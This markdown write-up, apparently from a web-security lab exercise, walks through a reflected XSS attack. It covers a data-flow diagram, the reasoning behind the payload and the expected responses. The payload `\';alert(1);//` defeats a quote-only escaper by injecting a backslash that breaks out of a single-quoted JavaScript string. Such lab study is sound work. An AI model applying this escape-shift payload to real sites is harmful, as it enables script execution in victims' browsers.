# Attack Chain — backslash escape-shift in single-quoted JS string

## Data flow
```
Attacker crafts URL   /?search=\';alert(1);//
   │  (transport: %5C%27%3Balert(1)%3B%2F%2F)
   ▼
[INPUT] GET /?search=…  →  server echoes with': \'→\\', <>→entities, \→\, " raw
   │
   ▼
[PROCESSING] template:  var searchTerms = 'TERM';
   │  rendered:  var searchTerms = '\\';alert(1);//';
   │    \\            → single backslash char (consumes BOTH the raw \ and the
   │                     escape backslash of \') — the SHIFT
   │    '             → TERMINATES the string (value: single backslash)
   │    ;alert(1);    → statement position → FIRES
   │    //';          → comment eats the template tail
   ▼
[TRUST BOUNDARY CROSSED] template text(data) → script source(code) at victim parse
   ▼
RESULT: alert(1) during page load in app origin; downstream tracker unaffected
(comment ends at the newline)
```

## Why this shape (terminator economics)
- Direct `'`-breakout dead: every lone `'` arrives `\'` (string content).
- `</script>` unnecessary: no need to leave the JS layer (contrast the
  quote+backslash-escaped sibling, where the terminator set is empty).
- `\` before `'` converts the escaper's OWN output into the terminator: the two
  backslashes collapse to one literal, stranding the `'` as a closer. One extra
  character defeats the entire escaper — hence "shift".
- `//` tail .: template suffix `';` would otherwise open an unterminated string
  across the newline (throw AFTER alert — noisy; commented = clean).

## Expected response sequence (verified)
1. `GET /?search=\';alert(1);//` → 200, breakout bytes in the script block.
2. Browser parses the inline script; injected statement runs during initial parse.
3. `alert(1)` → `is-solved` (first poll).